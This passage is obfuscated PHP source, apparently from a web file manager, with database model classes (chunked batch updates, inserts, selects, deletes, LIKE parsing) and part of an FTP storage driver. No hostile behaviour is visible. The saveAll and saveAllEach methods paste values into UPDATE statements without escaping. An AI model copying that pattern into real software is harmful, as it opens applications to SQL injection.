$this->tableMeta[$äÁ¾ú™ı[414]]; $‚€ÒÊ÷ = Model($this->tableMeta[$äÁ¾ú™ı[415]]); if ($Æ³±Ÿà£) { $ì«ë Æ = array($¶ğğ‘çö => $ê–ü„ÄÓ, $äÁ¾ú™ı[94] => $Æ³±Ÿà£); return $‚€ÒÊ÷->where($ì«ë Æ)->getField($äÁ¾ú™ı[417]); } $ì«ë Æ = array($¶ğğ‘çö => $ê–ü„ÄÓ); $ñÌóö‘ = $‚€ÒÊ÷->field($äÁ¾ú™ı[419])->where($ì«ë Æ)->select(); $ñÌóö‘ = array_to_keyvalue($ñÌóö‘, $äÁ¾ú™ı[94], $äÁ¾ú™ı[417]); return $ñÌóö‘; } private function checkDataAutoHas($¸«é¼“Å) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÍƒäÙ¢£) { if (in_array($¸«é¼“Å, explode($_SERVER[”ôÑ§ì¸][50], $ÍƒäÙ¢£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$……„é‹¯, $İ¢®°ô˜) { $¢ÙÌüşõ =& $_SERVER[”ôÑ§ì¸]; if (!is_array($……„é‹¯)) { return; } foreach ($this->dataAuto as $ıµ‰É¡) { $¹Âş‡•Ô = $ıµ‰É¡[0]; if (!in_array($İ¢®°ô˜, explode($¢ÙÌüşõ[50], $ıµ‰É¡[2]))) { continue; } switch (trim($ıµ‰É¡[3])) { case $¢ÙÌüşõ[364]: case $¢ÙÌüşõ[365]: $¾Åœ÷Ú° = $ıµ‰É¡[1]; $‘ ‹‡©” = isset($ıµ‰É¡[4]) ? (array) $ıµ‰É¡[4] : array(); if ($¾Åœ÷Ú° == $¢ÙÌüşõ[193] && array_key_exists($¹Âş‡•Ô, $……„é‹¯)) { if (!$……„é‹¯[$¹Âş‡•Ô]) { unset($……„é‹¯[$¹Âş‡•Ô]); } break; } if (isset($……„é‹¯[$¹Âş‡•Ô])) { array_unshift($‘ ‹‡©”, $……„é‹¯[$¹Âş‡•Ô]); } if ($¢ÙÌüşõ[364] == $ıµ‰É¡[3]) { $……„é‹¯[$¹Âş‡•Ô] = call_user_func_array($¾Åœ÷Ú°, $‘ ‹‡©”); } else { $……„é‹¯[$¹Âş‡•Ô] = call_user_func_array(array(&$this, $¾Åœ÷Ú°), $‘ ‹‡©”); } break; case $¢ÙÌüşõ[313]: if (isset($……„é‹¯[$¹Âş‡•Ô]) && $……„é‹¯[$¹Âş‡•Ô]) { $……„é‹¯[$¹Âş‡•Ô] = call_user_func_array(array(&$this, $ıµ‰É¡[1]), array($……„é‹¯[$¹Âş‡•Ô])); } break; case $¢ÙÌüşõ[316]: $……„é‹¯[$¹Âş‡•Ô] = $……„é‹¯[$ıµ‰É¡[1]]; break; case $¢ÙÌüşõ[337]: if (isset($……„é‹¯[$¹Âş‡•Ô]) && !is_string($……„é‹¯[$¹Âş‡•Ô])) { $……„é‹¯[$¹Âş‡•Ô] = json_encode_force($……„é‹¯[$¹Âş‡•Ô]); } break; case $¢ÙÌüşõ[366]: if ($……„é‹¯[$¹Âş‡•Ô] === $¢ÙÌüşõ[12]) { unset($……„é‹¯[$¹Âş‡•Ô]); } break; case $¢ÙÌüşõ[367]: $……„é‹¯[$¹Âş‡•Ô] = $ıµ‰É¡[1]; default: break; } } if ($İ¢®°ô˜ == $¢ÙÌüşõ[398]) { $³”‚ğ•Ş = strtolower($this->db->getDbType()); if (strpos($³”‚ğ•Ş, $¢ÙÌüşõ[13]) !== 0) { return; } $“°…Ë° = $this->field(!0)->fields; $ö×«Ûå© = $“°…Ë°[$¢ÙÌüşõ[295]]; if (isset($“°…Ë°[$¢ÙÌüşõ[294]])) { unset($ö×«Ûå©[$“°…Ë°[$¢ÙÌüşõ[294]]]); } foreach ($ö×«Ûå© as $«Çä½õ  => $İ¢®°ô˜) { if (!isset($……„é‹¯[$«Çä½õ ])) { $……„é‹¯[$«Çä½õ ] = $¢ÙÌüşõ[12]; } } } } private function dataAfterFilter(&$»×«›ÜÖ) { $¸Òº÷ß× =& $_SERVER[”ôÑ§ì¸]; foreach ($this->dataAuto as $è¥«¸õ) { $´ŠËäë¬ = $è¥«¸õ[0]; if (!isset($»×«›ÜÖ[$´ŠËäë¬])) { continue; } if (!in_array($¸Òº÷ß×[400], explode($¸Òº÷ß×[50], $è¥«¸õ[2]))) { continue; } switch (trim($è¥«¸õ[3])) { case $¸Òº÷ß×[364]: case $¸Òº÷ß×[365]: $¸Õ•ò×¸ = isset($è¥«¸õ[4]) ? (array) $è¥«¸õ[4] : array(); array_unshift($¸Õ•ò×¸, $»×«›ÜÖ[$´ŠËäë¬]); if (isset($è¥«¸õ[4]) && $è¥«¸õ[4] == $¸Òº÷ß×[420]) { $¸Õ•ò×¸ = array($»×«›ÜÖ[$´ŠËäë¬]); } if ($¸Òº÷ß×[364] == $è¥«¸õ[3]) { $»×«›ÜÖ[$´ŠËäë¬] = call_user_func_array($è¥«¸õ[1], $¸Õ•ò×¸); } else { $»×«›ÜÖ[$´ŠËäë¬] = call_user_func_array(array(&$this, $è¥«¸õ[1]), $¸Õ•ò×¸); } break; case $¸Òº÷ß×[313]: if (isset($»×«›ÜÖ[$´ŠËäë¬]) && $»×«›ÜÖ[$´ŠËäë¬]) { $»×«›ÜÖ[$´ŠËäë¬] = call_user_func_array(array(&$this, $è¥«¸õ[1]), array($»×«›ÜÖ[$´ŠËäë¬])); } break; case $¸Òº÷ß×[316]: $»×«›ÜÖ[$´ŠËäë¬] = $»×«›ÜÖ[$è¥«¸õ[1]]; break; case $¸Òº÷ß×[337]: $«Œá½¼ = $»×«›ÜÖ[$´ŠËäë¬]; $»×«›ÜÖ[$´ŠËäë¬] = json_decode($«Œá½¼, !0); if (is_null($»×«›ÜÖ[$´ŠËäë¬])) { $»×«›ÜÖ[$´ŠËäë¬] = $«Œá½¼; } break; case $¸Òº÷ß×[366]: if ($»×«›ÜÖ[$´ŠËäë¬] === $¸Òº÷ß×[12]) { unset($»×«›ÜÖ[$´ŠËäë¬]); } break; case $¸Òº÷ß×[367]: $»×«›ÜÖ[$´ŠËäë¬] = $è¥«¸õ[1]; break; default: break; } } } public function saveAll($ñàÀ•†) { $°ŸŸç =& $_SERVER[”ôÑ§ì¸]; $üßë‰¸û = $this->tablePrefix . $this->tableName; $©“¬É = self::SQL_WHERE_IN_CHUNK; $ñàÀ•† = is_array($ñàÀ•†) ? $ñàÀ•† : array(); $¼ªî™Õ = $°ŸŸç[421]; $íıååãİ = 0; $ã†øç° = array(); $–à ˆß = count($ñàÀ•†); for ($à”ê­Ø = 0; $à”ê­Ø < $–à ˆß; $à”ê­Ø++) { $û…ÙıĞ = $ñàÀ•†[$à”ê­Ø]; if (!is_array($û…ÙıĞ) || count($û…ÙıĞ) != 4) { continue; } $°¹Î’ª = "\125\x50\x44\101\124\105\40\x60{$üßë‰¸û}\x60\40\123\x45\x54\x20{$û…ÙıĞ[2]}\40\x3d\x20\x43\x41\x53\105\x20{$û…ÙıĞ[0]}\40\xa"; if ($íıååãİ == 0) { $¼ªî™Õ = $°¹Î’ª; } $ã†øç°[] = $°ŸŸç[118] . $û…ÙıĞ[1] . $°ŸŸç[118]; $íıååãİ++; $¼ªî™Õ .= "\40\127\x48\105\x4e\40\x27{$û…ÙıĞ[1]}\47\40\x54\x48\x45\116\x20\47{$û…ÙıĞ[3]}\47\40\12"; if ($íıååãİ == $©“¬É || $à”ê­Ø == $–à ˆß - 1) { $÷‡ûíÙ = implode($°ŸŸç[50], $ã†øç°); $¼ªî™Õ .= "\40\x45\x4e\x44\x20\x20\127\110\105\x52\105\x20{$û…ÙıĞ[0]}\40\x49\x4e\40\x28{$÷‡ûíÙ}\x29\40"; $this->execute($¼ªî™Õ); $íıååãİ = 0; $¼ªî™Õ = $°¹Î’ª; $this->chunkEventCheck(count($ã†øç°)); $ã†øç° = array(); } } $this->chunkEventSet(); } public function saveAllEach($½´¾·ß¶) { $Óø¸ùî¶ =& $_SERVER[”ôÑ§ì¸]; $…Ñ­«…Ë = $this->tablePrefix . $this->tableName; foreach ($½´¾·ß¶ as $¾õ–õ¤) { if (!is_array($¾õ–õ¤) || count($¾õ–õ¤) != 4) { continue; } $ã÷Û”œ = $¾õ–õ¤[0] . $Óø¸ùî¶[422] . $¾õ–õ¤[1] . $Óø¸ùî¶[118]; $‘æ¨İûÑ = $¾õ–õ¤[2] . $Óø¸ùî¶[422] . $¾õ–õ¤[3] . $Óø¸ùî¶[118]; $âĞ›ÜôŒ = "\165\160\x64\141\x74\x65\x20{$…Ñ­«…Ë}\40\163\145\164\40{$‘æ¨İûÑ}\40\167\150\x65\162\145\x20{$ã÷Û”œ}\x3b"; $this->execute($âĞ›ÜôŒ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ª¡úÍæë = false, $ğáè·Şß = false) { $this->_chunkEvent = $ª¡úÍæë; $this->_chunkEventParam = $ğáè·Şß; } private function chunkEventCheck($ßÁ—€ì¾) { if (!$this->_chunkEvent) { return; } $¥¬¹Åéâ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¥¬¹Åéâ[$_SERVER[”ôÑ§ì¸][423]] = $ßÁ—€ì¾; Hook::trigger($this->_chunkEvent, $¥¬¹Åéâ); } public function addAll($ù†£¦©ˆ, $Œ¹šÀá¹ = array(), $ä™ªË¿‹ = false) { $¡´ª·½ê =& $_SERVER[”ôÑ§ì¸]; ignore_timeout(); $÷»ÔÂ = self::SQL_WHERE_IN_CHUNK; if (empty($ù†£¦©ˆ)) { $this->error = think_lang($¡´ª·½ê[314]); return !1; } $Œ¹šÀá¹ = $this->_parseOptions($Œ¹šÀá¹); foreach ($ù†£¦©ˆ as $ëƒ’ÂœÍ => $¡¯™Ã) { $ù†£¦©ˆ[$ëƒ’ÂœÍ] = $this->_facade($¡¯™Ã); $this->_beforeInsert($ù†£¦©ˆ[$ëƒ’ÂœÍ], $Œ¹šÀá¹); } if (method_exists($this->db, $¡´ª·½ê[315])) { for ($íıñ÷­ğ = 0; $íıñ÷­ğ < count($ù†£¦©ˆ); $íıñ÷­ğ += $÷»ÔÂ) { $äÁÄ¶ë = array_slice($ù†£¦©ˆ, $íıñ÷­ğ, $÷»ÔÂ); if (!is_array($äÁÄ¶ë) || count($äÁÄ¶ë) == 0) { break; } $ı¼òõ¶Š = $this->db->insertAll($äÁÄ¶ë, $Œ¹šÀá¹, $ä™ªË¿‹); $this->chunkEventCheck(count($äÁÄ¶ë)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ù†£¦©ˆ as $ëƒ’ÂœÍ => $¡¯™Ã) { $ı¼òõ¶Š = $this->db->insert($¡¯™Ã, $Œ¹šÀá¹, $ä™ªË¿‹); } $this->commit(); } if (!1 !== $ı¼òõ¶Š) { $¦¶º„ = $this->getLastInsID(); if ($¦¶º„) { return $¦¶º„; } } return $ı¼òõ¶Š; } public function save($Ì¡Í¼– = '', $‚¬ˆŠÈ« = array()) { $ãÚî¹«¡ =& $_SERVER[”ôÑ§ì¸]; $û†“ ƒ¢ = self::SQL_WHERE_IN_CHUNK; $Ñ÷ã×š¸ = $this->optionsValue(); $¤‡ñø… = $this->findWhereField($Ñ÷ã×š¸); if (!$¤‡ñø…) { return parent::save($Ì¡Í¼–, $‚¬ˆŠÈ«); } $Ê»ÅÄ‚æ = 0; $€‹¡æíò = $Ñ÷ã×š¸[$ãÚî¹«¡[318]][$¤‡ñø…][1]; $€‹¡æíò = is_array($€‹¡æíò) ? $€‹¡æíò : array(); $ÏúåŠº° = count($€‹¡æíò); for ($ŸÖ¶®— = 0; $ŸÖ¶®— < $ÏúåŠº°; $ŸÖ¶®— += $û†“ ƒ¢) { $ñş æ‹Ğ = array_slice($€‹¡æíò, $ŸÖ¶®—, $û†“ ƒ¢); if (!is_array($ñş æ‹Ğ) || count($ñş æ‹Ğ) == 0) { break; } $Ñ÷ã×š¸[$ãÚî¹«¡[318]][$¤‡ñø…][1] = $ñş æ‹Ğ; $this->optionsValue($Ñ÷ã×š¸); $Ê»ÅÄ‚æ += parent::save($Ì¡Í¼–, $‚¬ˆŠÈ«); $this->chunkEventCheck(count($ñş æ‹Ğ)); } $this->chunkEventSet(); return $Ê»ÅÄ‚æ; } public function add($ãü¤ºİ = '', $¡™Šß«É = array(), $§áá˜¸ = false) { if ($this->addTaskStatus && is_array($ãü¤ºİ)) { $this->addTaskData[] = $ãü¤ºİ; return; } return parent::add($ãü¤ºİ, $¡™Šß«É, $§áá˜¸); } public function parseWhereLike($†µ»ßÒ, $ƒ˜øˆ›€ = '', $À¬œå‹š = false, &$€İñŸ©Ú = false) { $ˆ¡­àÎ =& $_SERVER[”ôÑ§ì¸]; $¥¥›¤Î = $GLOBALS[$ˆ¡­àÎ[6]][$ˆ¡­àÎ[424]]; if (!$¥¥›¤Î[$ˆ¡­àÎ[425]]) { return $†µ»ßÒ; } if (!is_array($†µ»ßÒ)) { return $†µ»ßÒ; } $Õ„ƒ±Æ = array(); $Ò×»òµ‘ = 0; foreach ($†µ»ßÒ as $ëºÍ‘°Ë => $™ì ) { if (is_array($™ì ) && count($™ì ) == 2 && $™ì [0] == $ˆ¡­àÎ[426] && is_string($™ì [1]) && substr($™ì [1], 0, 1) == $ˆ¡­àÎ[427] && substr($™ì [1], strlen($™ì [1]) - 1, 1) == $ˆ¡­àÎ[427]) { $€İñŸ©Ú = !0; $¹”™ûâº = is_string($ëºÍ‘°Ë) ? $ëºÍ‘°Ë : $ƒ˜øˆ›€; $¸Æ¾öı· = substr($™ì [1], 1, strlen($™ì [1]) - 2); $¸Æ¾öı· = $this->db->escapeString($¸Æ¾öı·); if (!strpos($¹”™ûâº, $ˆ¡­àÎ[10])) { $¹”™ûâº = $ˆ¡­àÎ[428] . $¹”™ûâº . $ˆ¡­àÎ[428]; } $ìµŒ‹Ó = $ˆ¡­àÎ[202] . $¸Æ¾öı· . $ˆ¡­àÎ[202]; $¸Æ¾öı· = str_replace(array($ˆ¡­àÎ[10], $ˆ¡­àÎ[429], $ˆ¡­àÎ[11]), $ˆ¡­àÎ[430], $¸Æ¾öı·); if ($¥¥›¤Î[$ˆ¡­àÎ[431]]) { $ìµŒ‹Ó = $ˆ¡­àÎ[432] . $¸Æ¾öı· . $ˆ¡­àÎ[433]; if ($¥¥›¤Î[$ˆ¡­àÎ[434]]) { $ìµŒ‹Ó = $ˆ¡­àÎ[433] . $¸Æ¾öı· . $ˆ¡­àÎ[432]; } } $Õ„ƒ±Æ[$Ò×»òµ‘] = $ˆ¡­àÎ[435] . $¹”™ûâº . $ˆ¡­àÎ[436] . $ìµŒ‹Ó . $ˆ¡­àÎ[437]; $Ò×»òµ‘++; continue; } if (is_array($™ì )) { $ƒ˜øˆ›€ = is_string($ëºÍ‘°Ë) ? $ëºÍ‘°Ë : $ƒ˜øˆ›€; $™ì  = $this->parseWhereLike($™ì , $ƒ˜øˆ›€, !0, $€İñŸ©Ú); } if (is_numeric($ëºÍ‘°Ë)) { $Õ„ƒ±Æ[$Ò×»òµ‘] = $™ì ; $Ò×»òµ‘++; } else { $Õ„ƒ±Æ[$ëºÍ‘°Ë] = $™ì ; } } if ($€İñŸ©Ú && !$À¬œå‹š) { } return $Õ„ƒ±Æ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÔÑµØ·æ = array()) { $¾Ìçû…¾ =& $_SERVER[”ôÑ§ì¸]; $Î×£ö´õ = self::SQL_WHERE_IN_CHUNK; $­ÎÍÂÁ» = $this->optionsValue(); $±¯¯“Ò = $this->findWhereField($­ÎÍÂÁ»); if (!$±¯¯“Ò || isset($­ÎÍÂÁ»[$¾Ìçû…¾[335]]) || isset($­ÎÍÂÁ»[$¾Ìçû…¾[396]])) { return parent::select($ÔÑµØ·æ); } $ãÑ£Ş¯ = $­ÎÍÂÁ»[$¾Ìçû…¾[318]][$±¯¯“Ò][1]; $ãÑ£Ş¯ = is_array($ãÑ£Ş¯) ? $ãÑ£Ş¯ : array(); $ÓÚˆÎøì = null; for ($ğ‡êº‘Å = 0; $ğ‡êº‘Å < count($ãÑ£Ş¯); $ğ‡êº‘Å += $Î×£ö´õ) { $Ø§ë¦®è = array_slice($ãÑ£Ş¯, $ğ‡êº‘Å, $Î×£ö´õ); if (!is_array($Ø§ë¦®è) || count($Ø§ë¦®è) == 0) { break; } $­ÎÍÂÁ»[$¾Ìçû…¾[318]][$±¯¯“Ò][1] = $Ø§ë¦®è; $this->optionsValue($­ÎÍÂÁ»); $ŠüÅäà = parent::select($ÔÑµØ·æ); if (!$ŠüÅäà) { continue; } $ÓÚˆÎøì = is_array($ÓÚˆÎøì) ? $ÓÚˆÎøì : array(); $ÓÚˆÎøì = array_merge($ÓÚˆÎøì, $ŠüÅäà); } return $ÓÚˆÎøì; } public function delete($¢ÍÄÛ§¸ = array()) { $êŒ—–½£ =& $_SERVER[”ôÑ§ì¸]; $­Ğ¡Áõ© = self::SQL_WHERE_IN_CHUNK; $ßäÔø²À = $this->optionsValue(); $“âÁèã = $this->findWhereField($ßäÔø²À); if (!$“âÁèã) { return parent::delete($¢ÍÄÛ§¸); } $¦èé÷‹¾ = 0; $ı áá—· = $ßäÔø²À[$êŒ—–½£[318]][$“âÁèã][1]; $ı áá—· = is_array($ı áá—·) ? $ı áá—· : array(); for ($¹Êåû¾² = 0; $¹Êåû¾² < count($ı áá—·); $¹Êåû¾² += $­Ğ¡Áõ©) { $ïÂÔÎâÚ = array_slice($ı áá—·, $¹Êåû¾², $­Ğ¡Áõ©); if (!is_array($ïÂÔÎâÚ) || count($ïÂÔÎâÚ) == 0) { break; } $ßäÔø²À[$êŒ—–½£[318]][$“âÁèã][1] = $ïÂÔÎâÚ; $this->optionsValue($ßäÔø²À); $¦èé÷‹¾ += parent::delete($¢ÍÄÛ§¸); } return $¦èé÷‹¾; } private function findWhereField($Û¤«ù•¥) { $ÍÆç¨Í =& $_SERVER[”ôÑ§ì¸]; $‰ºì»©† = self::SQL_WHERE_IN_CHUNK; if (!is_array($Û¤«ù•¥) || !is_array($Û¤«ù•¥[$ÍÆç¨Í[318]])) { return !1; } foreach ($Û¤«ù•¥[$ÍÆç¨Í[318]] as $’ˆ›Êİ => $ÁÙ¨îæè) { if (is_array($ÁÙ¨îæè) && isset($ÁÙ¨îæè[0]) && is_string($ÁÙ¨îæè[0]) && strtolower($ÁÙ¨îæè[0]) == $ÍÆç¨Í[7] && is_array($ÁÙ¨îæè[1]) && count($ÁÙ¨îæè[1]) > $‰ºì»©†) { ignore_timeout(); return $’ˆ›Êİ; } } return !1; } public function setMasterDB($ÑâÔ¢Æ = true) { think_config($_SERVER[”ôÑ§ì¸][438], $ÑâÔ¢Æ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\x65\155\x4f\x70\x74\151\x6f\156"; public $field = array(); public function listData($°¾Ùúµ¦ = false, $ğ£×—»¥ = "\155\x6f\144\151\x66\171\x54\x69\155\145", $™ğ»—ë¯ = false) { $«£ßÊ¶ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ù”ºÕó = array_values($«£ßÊ¶); if ($Ù”ºÕó && $Ù”ºÕó[0] && !is_array($Ù”ºÕó[0])) { Model($this->modelType)->cacheRemove($this->optionType); $«£ßÊ¶ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$«£ßÊ¶) { return $°¾Ùúµ¦ ? null : array(); } if (!$°¾Ùúµ¦) { $«£ßÊ¶ = array_filter(array_values($«£ßÊ¶)); return array_sort_by($«£ßÊ¶, $ğ£×—»¥, $™ğ»—ë¯); } return $«£ßÊ¶[$_SERVER[”ôÑ§ì¸][439] . $°¾Ùúµ¦]; } public function insert($ÜÏûÂ”ä) { $ëØÊûËÕ =& $_SERVER[”ôÑ§ì¸]; $ÜÏûÂ”ä = array_field_key($ÜÏûÂ”ä, $this->field); $™©‹Ã»« = Model($this->modelType)->get($ëØÊûËÕ[440], $this->optionType . $ëØÊûËÕ[441]); $™©‹Ã»« = $™©‹Ã»« ? $™©‹Ã»« : 0; $ÜÏûÂ”ä[$ëØÊûËÕ[442]] = ++$™©‹Ã»«; $ÜÏûÂ”ä[$ëØÊûËÕ[214]] = time(); $ÜÏûÂ”ä[$ëØÊûËÕ[85]] = time(); Model($this->modelType)->set($ëØÊûËÕ[440], $™©‹Ã»«, $this->optionType . $ëØÊûËÕ[441]); Model($this->modelType)->set($ëØÊûËÕ[439] . $™©‹Ã»«, $ÜÏûÂ”ä, $this->optionType); return $™©‹Ã»«; } public function update($ìş»Š£, $«Öß£Š¥) { $œ”Øƒ¿¥ =& $_SERVER[”ôÑ§ì¸]; $«Öß£Š¥ = array_field_key($«Öß£Š¥, $this->field); $º°ã†Åâ = $this->listData($ìş»Š£); if (!$º°ã†Åâ || !$ìş»Š£) { return !1; } $«Öß£Š¥ = array_merge($º°ã†Åâ, $«Öß£Š¥); $«Öß£Š¥[$œ”Øƒ¿¥[85]] = time(); return Model($this->modelType)->set($œ”Øƒ¿¥[439] . $ìş»Š£, $«Öß£Š¥, $this->optionType); } public function remove($Îª¹¹ë¯) { if (!$Îª¹¹ë¯) { return !1; } return Model($this->modelType)->remove($_SERVER[”ôÑ§ì¸][439] . $Îª¹¹ë¯, $this->optionType); } public function clear() { $«‹ß±­™ =& $_SERVER[”ôÑ§ì¸]; Model($this->modelType)->remove($«‹ß±­™[440], $this->optionType . $«‹ß±­™[441]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($‰úû´°Ğ, $½ê¦±”¤) { if (!$½ê¦±”¤) { return !1; } $€Œš‹š = $this->listData(); $€Œš‹š = array_to_keyvalue($€Œš‹š, $‰úû´°Ğ); return isset($€Œš‹š[$½ê¦±”¤]) ? $€Œš‹š[$½ê¦±”¤] : !1; } public function findByName($Ì’§ı¯) { return $this->findByKey($_SERVER[”ôÑ§ì¸][32], $Ì’§ı¯); } protected function resetData($‚°òÀÒ) { $øú£õË™ =& $_SERVER[”ôÑ§ì¸]; $‚°òÀÒ = is_array($‚°òÀÒ) ? $‚°òÀÒ : array(); $ÙÎÇÍß¸ = array(); for ($êÁªÎèÙ = 0; $êÁªÎèÙ < count($‚°òÀÒ); $êÁªÎèÙ++) { $ÙÎÇÍß¸[$øú£õË™[439] . $‚°òÀÒ[$êÁªÎèÙ][$øú£õË™[442]]] = $‚°òÀÒ[$êÁªÎèÙ]; } return Model($this->modelType)->set($ÙÎÇÍß¸, !1, $this->optionType); } private function getAutoName($Ëñ˜ÜÔ) { $²°ˆõòÎ = array_to_keyvalue($this->listData(), $_SERVER[”ôÑ§ì¸][32]); if (!$²°ˆõòÎ || !isset($²°ˆõòÎ[$Ëñ˜ÜÔ])) { return $Ëñ˜ÜÔ; } for ($ğûË»û = 1; $ğûË»û < count($²°ˆõòÎ); $ğûË»û++) { $„ÅÊˆ = $Ëñ˜ÜÔ . "\50{$ğûË»û}\x29"; if (!isset($²°ˆõòÎ[$„ÅÊˆ])) { return $„ÅÊˆ; } } return $„ÅÊˆ; } } goto CÙæÄƒˆĞõ; EèŠø§´Ò÷: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($­Ó¯°‰ç) { parent::__construct(); if (count($­Ó¯°‰ç) > 0) { $this->_init($­Ó¯°‰ç); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($•€ËíŒ) { $Ÿ í åÒ =& $_SERVER[”ôÑ§ì¸]; global $config; $this->appCharset = $config[$Ÿ í åÒ[1381]]; $this->systemCharset = $config[$Ÿ í åÒ[1382]]; if (isset($•€ËíŒ[$Ÿ í åÒ[1383]]) && $•€ËíŒ[$Ÿ í åÒ[1383]]) { $this->systemCharset = $•€ËíŒ[$Ÿ í åÒ[1383]]; } } public function iconvApp($ÏÊğ©) { return $this->iconvTo($ÏÊğ©, $this->systemCharset, $this->appCharset); } public function iconvSystem($­³˜úİ) { return $this->iconvTo($­³˜úİ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ı© ×Åû) { $Äæ°ÏéŠ =& $_SERVER[”ôÑ§ì¸]; $ò“°Ë£ = $this->iconvApp($this->pathBase); $ı© ×Åû = $this->iconvApp($ı© ×Åû); if (substr($ò“°Ë£, 0, 2) == $Äæ°ÏéŠ[1309]) { $ò“°Ë£ = BASIC_PATH . substr($ò“°Ë£, 2); } if (substr($ı© ×Åû, 0, 2) == $Äæ°ÏéŠ[1309]) { $ı© ×Åû = BASIC_PATH . substr($ı© ×Åû, 2); } $ò“°Ë£ = KodIO::clear($ò“°Ë£); $ı© ×Åû = KodIO::clear($ı© ×Åû); $ı© ×Åû = substr($ı© ×Åû, strlen($ò“°Ë£)); if (empty($this->pathDriver)) { return $ı© ×Åû; } return $this->pathDriver . $Äæ°ÏéŠ[8] . ltrim($ı© ×Åû, $Äæ°ÏéŠ[8]); } private function _init($ú€õå† = array()) { $«¶ƒ¦Âù =& $_SERVER[”ôÑ§ì¸]; if (!function_exists($«¶ƒ¦Âù[1384])) { throw new Exception(LNG($«¶ƒ¦Âù[1385])); } $this->config = $ú€õå†; $this->charsetReset($ú€õå†); foreach ($ú€õå† as $â’Â©© => $¹á´İÕŠ) { if (isset($this->{$â’Â©©})) { $this->{$â’Â©©} = $¹á´İÕŠ; } } return $this->_login($ú€õå†); } private function _login($ùÙáÚÔÄ) { $”ÑïÂ¼À =& $_SERVER[”ôÑ§ì¸]; static $’óç¹»Ò = array(); $½€ÚØ·‡ = md5(json_encode($ùÙáÚÔÄ)); if (isset($’óç¹»Ò[$½€ÚØ·‡])) { foreach ($’óç¹»Ò[$½€ÚØ·‡] as $³±€æÖÏ => $ß´©¾Ò¨) { $this->{$³±€æÖÏ} = $ß´©¾Ò¨; } return !0; } $‘ä²åª¾ = parse_url(trim($this->server, $”ÑïÂ¼À[8])); $this->host = $‘ä²åª¾[$”ÑïÂ¼À[195]]; $‡ë¡å²ƒ = isset($‘ä²åª¾[$”ÑïÂ¼À[194]]) && $‘ä²åª¾[$”ÑïÂ¼À[194]] == $”ÑïÂ¼À[1386] ? !0 : !1; $this->scheme = $‡ë¡å²ƒ ? $”ÑïÂ¼À[1387] : $”ÑïÂ¼À[1388]; $this->port = isset($‘ä²åª¾[$”ÑïÂ¼À[196]]) ? $‘ä²åª¾[$”ÑïÂ¼À[196]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $•³úäš = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $îÚ¼ñ—Æ = $this->pasv == $”ÑïÂ¼À[88] ? !0 : !1; @ftp_pasv($this->connect, $îÚ¼ñ—Æ); $’óç¹»Ò[$½€ÚØ·‡] = array($”ÑïÂ¼À[1389] => $this->connect, $”ÑïÂ¼À[195] => $this->host, $”ÑïÂ¼À[194] => $this->scheme, $”ÑïÂ¼À[196] => $this->port); return $•³úäš; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ú”÷óô, $­ğï¶è® = '', $àÍÄ˜õÎ = REPEAT_RENAME) { if ($this->setContent($Ú”÷óô, $­ğï¶è®)) { return $this->getPathOuter($Ú”÷óô); } return !1; } public function mkdir($÷Äù±ˆÃ, $ŞÎ¢Ï‘ã = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $÷Äù±ˆÃ = $this->iconvSystem($÷Äù±ˆÃ); if ($this->_isFolder($÷Äù±ˆÃ) || @ftp_mkdir($this->connect, $÷Äù±ˆÃ)) { return $this->getPathOuter($÷Äù±ˆÃ); } if (!$this->mkdir($this->pathFather($÷Äù±ˆÃ))) { return !1; } if ($÷Äù±ˆÃ = @ftp_mkdir($this->connect, $÷Äù±ˆÃ)) { return $this->getPathOuter($÷Äù±ˆÃ); } return !1; } public function copyFile($«’‡ƒ, $é—óÒØø) { if (!$this->_isconn()) { return !1; } $¾º£‰ø = $this->pathThis($this->iconvSystem($«’‡ƒ)); $ğ‚¸Ü¿Ğ = $this->tempFile($¾º£‰ø); $˜Ò ±äø = $this->iconvApp($ğ‚¸Ü¿Ğ); $this->download($«’‡ƒ, $˜Ò ±äø); $ööß–Èâ = $this->upload($é—óÒØø, $˜Ò ±äø); $this->tempFileRemve($ğ‚¸Ü¿Ğ); return $ööß–Èâ; } public function moveFile($Û¯…üÜ­, $´Æ¿ë) { if (!$this->_isconn()) { return !1; } $Û¯…üÜ­ = $this->iconvSystem($Û¯…üÜ­); $´Æ¿ë = $this->iconvSystem($´Æ¿ë); $İºÄ‡ = @ftp_rename($this->connect, $Û¯…üÜ­, $´Æ¿ë); return $İºÄ‡ ? $this->getPathOuter($´Æ¿ë) : !1; } public function delFile($øçÏ’ì) { if (!$this->_isconn()) { return !1; } $øçÏ’ì = $this->iconvSystem($øçÏ’ì); return @ftp_delete($this->connect, $øçÏ’ì); } public function delFolder($¤±ŠÑŸ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $åÆ²òÎ® = $œ¸¯°ÌÁ = array(); $this->fileList($¤±ŠÑŸ, $åÆ²òÎ®, $œ¸¯°ÌÁ, !0); $this->listItemCache = !0; foreach ($œ¸¯°ÌÁ as $ì³°î®Í) { $ô±ƒñ½ç = $this->iconvSystem($ì³°î®Í[$_SERVER[”ôÑ§ì¸][32]]); 